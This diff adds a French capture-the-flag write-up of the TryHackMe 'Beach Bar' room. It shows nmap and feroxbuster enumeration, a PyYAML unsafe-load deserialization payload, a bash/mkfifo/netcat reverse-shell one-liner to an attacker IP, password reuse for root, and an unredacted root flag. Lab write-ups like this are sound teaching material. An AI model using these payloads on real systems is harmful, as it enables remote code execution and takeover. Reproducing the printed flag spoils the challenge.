@@ -592,6 +592,241 @@ Il ne reste qu'à convertir le contenu en utilisant la bonne recette sur [CyberC
 
 ## Jour 5 : [*Beach Bar*](https://tryhackme.com/room/hh-beachbar-d849f7f7)
 
+Dans le cas d'une machine *Boot-To-Root* la première étape consiste à scanner la machine avec {% include dictionary.html word="NMAP" %} pour savoir ce qu'elle renferme.
+
+### 5.1 Enumération <!-- omit in toc -->
+
+```bash
+nmap -sC -sV 10.129.188.85 -oN nmap_results
+```
+
+{% capture spoil %}
+
+```txt
+Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 14:00 +0200
+Nmap scan report for 10.129.188.85
+Host is up (0.019s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 86:53:b9:c1:6d:a0:cb:a7:fd:f7:b1:81:a3:3a:71:7f (ECDSA)
+|_  256 98:d6:00:97:97:1d:7a:2b:c9:d1:60:7f:e3:82:e2:4e (ED25519)
+80/tcp open  http    Gunicorn
+| http-title: Beach Bar // Sign in
+|_Requested resource was /login
+|_http-server-header: gunicorn
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 7.98 seconds
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Un serveur {% include dictionary.html word="HTTP" %} tournant sur le port 80, l'étape suivante consiste à découvrir de potentielles pages cachées qui pourrait être intéressante.
+
+```bash
+feroxbuster -u http://10.129.188.85 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+```
+
+{% capture spoil %}
+
+```txt
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.13.1
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.129.188.85/
+ 🚩  In-Scope Url          │ 10.129.188.85
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.13.1
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        5l       31w      207c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+200      GET       84l      305w     3522c http://10.129.188.85/login
+302      GET        5l       22w      199c http://10.129.188.85/ => http://10.129.188.85/login
+302      GET        5l       22w      199c http://10.129.188.85/logout => http://10.129.188.85/login
+302      GET        5l       22w      199c http://10.129.188.85/export => http://10.129.188.85/login
+302      GET        5l       22w      199c http://10.129.188.85/dashboard => http://10.129.188.85/login
+302      GET        5l       22w      199c http://10.129.188.85/import => http://10.129.188.85/login
+[####################] - 3m    220547/220547  0s      found:6       errors:0      
+[####################] - 3m    220546/220546  1241/s  http://10.129.188.85/
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Le scanner {% include dictionary.html word="feroxbuster" %} a permis de trouver des pages `/dashboard`, `/export`, `/import`, mais celles-ci redirigent exclusivement vers la page de login.
+
+### 5.2 Analyse du site <!-- omit in toc -->
+
+Après avoir tenter des identifiants de type `admin:admin` sans succès, l'analyse du code source du site permet de découvrir un commentaire incluant des identifiants de démonstration :
+
+```html
+<!--
+staff note: the demo DJ login is still enabled for the soft opening.
+dj / dj  -- swap this before the season starts (ticket BAR-7)
+-->
+```
+
+Ces identifiants permettent de se connecter et d'accéder au *dashboard*. En utilisant la fonction `/export` il est possible de récupérer un fichier YAML qui pourra servir de base pour obtenir un accès à la machine
+
+```yaml
+# Beach Bar jukebox playlist export
+playlist:
+  name: Sunset Session
+  vibe: golden hour
+  tracks:
+    - artist: Khruangbin
+      title: Maria Tambien
+    - artist: Men I Trust
+      title: Show Me How
+    - artist: Crumb
+      title: Locket
+```
+
+Une tentative directe d'importer un [Reverse Shell PHP](https://github.com/pentestmonkey/php-reverse-shell) ne fonctionne pas, le site attend exclusivement un format YAML.
+
+En essayant une playlist personnalisée au format YAML, la réponse est convertie au format JSON sur le site.
+
+```yaml
+# Beach Bar jukebox playlist export
+playlist:
+  name: Hack Session
+  vibe: Pure Chaos
+  tracks:
+    - artist: Myself
+      title: TryHackMe
+```
+
+{% include elements/figure_spoil.html image="images/THM/HH2026/Capture_ecran_2026-08-22_Playlist.png" caption="La playlist est convertie au format JSON" %}
+
+Une recherche sur l'exploitation du format YAML pour exécuter du code permet de trouver le site [HackTricks](https://hacktricks.wiki/fr/pentesting-web/deserialization/python-yaml-deserialization.html#r%C3%A9f%C3%A9rence-rapide-du-comportement-du-loader) qui permet de tester le comportement du *loader*.
+
+```yaml
+!!python/object/apply:builtins.range [1, 10, 1]
+```
+
+La réponse étant `range(1, 10)` renseigne sur le fait que le *loader* utilise l'outil `unsafe_loader` de la bibliothèque `PyYAML`.
+
+En utilisant une charge utile destinée à interagir avec le système, la réponse obtenue est uniquement le chiffre 0. Mais il s'agit d'un retour indiquant que la commande a été effectuée avec succès.
+
+Sur une machine Linux, la commande entière donnerait l'information suivie de `0` également :
+
+```py
+from os import system
+system("id")
+```
+
+```txt
+uid=0(root) gid=0(root) groupes=0(root)
+0
+```
+
+{% include elements/figure_spoil.html image="images/THM/HH2026/Capture_ecran_2026-08-22_Payload_test.png" caption="Payload de test traitée avec succès" %}
+
+Pour obtenir un {% include dictionary.html word="reverse-shell" %}, la payload utilisée est :
+
+```yaml
+!!python/object/apply:os.system [bash -c "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.164.122 9000 >/tmp/f"]
+```
+
+Sur la machine d'attaque, ouvrir un port en écoute sur le même port avec {% include dictionary.html word="Netcat" %}
+
+```bash
+nc -lvnp 9000
+```
+
+Après avoir stabiliser le reverse shell avec les commandes ci-dessous, l'analyse de la machine peut commencer.
+
+{% gist ab3c791e25baa7b437d0324f6d3195af %}
+
+```bash
+id
+```
+
+{% capture spoil %}
+
+```txt
+uid=1001(bartender) gid=1001(bartender) groups=1001(bartender)
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+```bash
+cd /home/bartender
+
+cat user.txt
+```
+
+{% capture spoil %}
+
+```txt
+THM{[...expurgé...]}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Une analyse des processus permet de découvrir qu'en plus du service `gunicorn` qui gère le site Internet actuellement exploité, un service de jukebox est également actif.
+
+```bash
+ps x -u root
+```
+
+{% capture spoil %}
+
+```txt
+[...expurgé pour brièveté...]
+616 ?        Ss     0:00 /opt/beach-bar/venv/bin/python /opt/beach-bar/jukeboxd/jukeboxd.py --stream-pass [..expurgé...]! --bitrate 320k
+[...expurgé pour brièveté...]
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+Ce processus comporte un mot de passe. En le réutilisant, celui-ci permet de se connecter en tant que root sur la machine.
+
+```bash
+su -
+
+id
+```
+
+{% capture spoil %}
+
+```txt
+uid=0(root) gid=0(root) groups=0(root)
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
+```bash
+cat root.txt
+```
+
+{% capture spoil %}
+
+```txt
+THM{cr3d3nt14l_r3us3_4t_th3_b34ch_b4r}
+```
+
+{% endcapture %}
+{% include elements/spoil.html %}
+
 ## Jour 6 : [*Overheard at Breakfast*](https://tryhackme.com/room/hh-overheardatbreakfast-6f01793c)
 
 ## Jour 7 : [*Do Not Disturb*](https://tryhackme.com/room/hh-donotdisturb-84a45644)
